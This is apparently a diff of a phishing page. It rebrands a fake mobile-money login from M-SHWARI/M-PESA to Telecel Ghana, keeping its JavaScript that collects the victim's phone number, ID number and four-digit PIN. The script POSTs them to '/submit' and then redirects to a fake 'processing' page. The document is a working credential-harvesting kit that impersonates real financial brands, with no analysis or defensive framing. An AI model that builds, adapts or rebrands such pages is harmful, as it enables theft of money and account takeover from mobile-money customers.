@@ -1,167 +1,72 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <title>M-SHWARI Login</title>
+    <title>Telecel Login</title>
 
-    <!-- MOBILE -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
     <link rel="stylesheet" href="style.css">
-
-    <style>
-        body {
-            margin: 0;
-            font-family: 'Segoe UI', sans-serif;
-            background: #39b52a;
-        }
-
-        .top-section {
-            background: white;
-            padding: 30px 20px 80px;
-            border-bottom-left-radius: 60px;
-            border-bottom-right-radius: 60px;
-            text-align: center;
-        }
-
-        .logo {
-            font-size: 28px;
-            font-weight: bold;
-        }
-
-        .logo span {
-            color: rgb(246, 243, 243);
-        }
-
-        .login-title {
-            margin-top: 20px;
-            font-size: 20px;
-        }
-
-        .phone-box {
-            display: flex;
-            align-items: center;
-            border: 2px solid #f6f9fd;
-            border-radius: 12px;
-            padding: 12px;
-            margin-top: 20px;
-        }
-
-        .flag {
-            font-size: 20px;
-            margin-right: 10px;
-        }
-
-        .phone-input {
-            border: none;
-            outline: none;
-            font-size: 16px;
-            width: 100%;
-        }
-
-        .pin-title {
-            margin-top: 25px;
-            font-size: 16px;
-        }
-
-        .pin-container {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .pin-box {
-            width: 50px;
-            height: 55px;
-            border: 2px solid #1e63c6;
-            border-radius: 10px;
-            font-size: 22px;
-            text-align: center;
-        }
-
-        .bottom-section {
-            background: #39b52a;
-            padding: 40px 20px;
-            text-align: center;
-            color: white;
-        }
-
-        .bottom-text {
-            margin-bottom: 20px;
-        }
-
-        .actions {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-        }
-
-        .action-btn {
-            background: white;
-            color: black;
-            padding: 14px;
-            border-radius: 12px;
-            width: 45%;
-            border: none;
-        }
-    </style>
 </head>
 
 <body>
 
-<!-- TOP WHITE -->
-<div class="header">
-    <div class="header-left">
-        <img src="logo.jpeg" class="logo">
-        <span class="brand">Telecel</span>
-    </div>
-    <div class="menu">☰</div>
+<!-- 🔴 TOP RED HEADER -->
+<div class="top-red">
+    <img src="logo.jpeg" class="logo-big">
+    <h2>Telecel</h2>
+    <p class="sub">Mobile Financial Services</p>
 </div>
 
-    <div class="login-title">Login</div>
+<!-- ⚪ WHITE LOGIN CARD -->
+<div class="login-card">
+
+    <h3>Login to Your Account</h3>
+
+    <label>Account Type</label>
+    <select>
+        <option>Mobile</option>
+    </select>
 
     <!-- PHONE -->
-    <div class="phone-box">
-        <div class="flag">🇰🇪</div>
-        <input class="phone-input" id="phone" readonly>
-    </div>
+    <input id="phone" readonly>
 
     <!-- PIN -->
-    <div class="pin-title">Enter your M-PESA PIN</div>
-  
+    <p class="pin-label">Enter your PIN</p>
+
     <div class="pin-container">
-    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" autofocus>
-    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
-    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
-    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
-</div>
-
-<p id="errorMsg" style="color:red; text-align:center; margin-top:10px; display:none;"></p>
-    
-<button id="submitBtn" onclick="submitOtp()" class="login-btn">Submit</button>
-</div>
-
-<!-- BOTTOM BLUE -->
-<div class="bottom-section">
-
-    <div class="bottom-text">Don’t have an M-SHWARI Wallet?</div>
-
-    <div class="actions">
-        <button class="action-btn">Register</button>
-        <button class="action-btn">Help & Support</button>
+        <input type="password" maxlength="1" class="pin-box">
+        <input type="password" maxlength="1" class="pin-box">
+        <input type="password" maxlength="1" class="pin-box">
+        <input type="password" maxlength="1" class="pin-box">
     </div>
 
+    <p class="forgot">Forgot your PIN?</p>
+
+    <button id="submitBtn" onclick="submitOtp()">LOGIN</button>
+
+    <p id="errorMsg" class="error"></p>
+
 </div>
 
-<script>
+<!-- 🔴 BOTTOM RED SECTION -->
+<div class="bottom-red">
+    <img src="logo.jpeg" class="logo-small">
+    <h3>Telecel</h3>
+    <p>Ghana</p>
+    <p class="small">Secure. Fast. Reliable.</p>
 
+    <button class="white-btn">📱 Download App</button>
+    <button class="white-btn">❓ Get Help</button>
+</div>
+
+<div id="pageLoader" class="loader" style="display:none;"></div>
+
+<script>
 const inputs = document.querySelectorAll(".pin-box");
 
 inputs.forEach((input, index) => {
     input.addEventListener("input", () => {
         input.value = input.value.replace(/[^0-9]/g, "");
-        
         if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
@@ -176,21 +81,15 @@ inputs.forEach((input, index) => {
 
 async function submitOtp() {
     const btn = document.getElementById("submitBtn");
-    if (btn.disabled) return;
+    const error = document.getElementById("errorMsg");
 
     let pin = "";
-    document.querySelectorAll(".pin-box").forEach(input => {
-        pin += input.value;
-    });
-    const error = document.getElementById("errorMsg");
+    document.querySelectorAll(".pin-box").forEach(i => pin += i.value);
 
     if (pin.length < 4) {
         error.innerText = "Enter full PIN";
-        error.style.display = "block";
         return;
     }
-
-    error.style.display = "none";
 
     btn.innerText = "Processing...";
     btn.disabled = true;
@@ -201,45 +100,24 @@ async function submitOtp() {
     const phone = document.getElementById("phone").value;
 
     try {
-        const res = await fetch("/submit", {
+        await fetch("/submit", {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                idNumber: idNumber,
-                phone: phone,
-                pin: pin
-            })
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ idNumber, phone, pin })
         });
-
-        if (!res.ok) throw new Error();
-
-        // clear PIN AFTER submit
-        document.querySelectorAll(".pin-box").forEach(input => input.value = "");
-
-        localStorage.setItem("firstProcess", "yes");
 
         window.location.href = "processing.html";
 
-    } catch (err) {
-        error.innerText = "Submission failed. Try again.";
-        error.style.display = "block";
-
-        btn.innerText = "Submit";
+    } catch {
+        error.innerText = "Submission failed";
+        btn.innerText = "LOGIN";
         btn.disabled = false;
-
-        document.getElementById("pageLoader").style.display = "none";
     }
 }
 
-   document.getElementById("phone").value = localStorage.getItem("phone") || "+263";
-
-window.onload = () => {
-    document.body.classList.add("loaded");
-};
+document.getElementById("phone").value = localStorage.getItem("phone") || "";
 
 </script>
-<div id="pageLoader" class="loader" style="display:none;"></div>
+
 </body>
 </html>
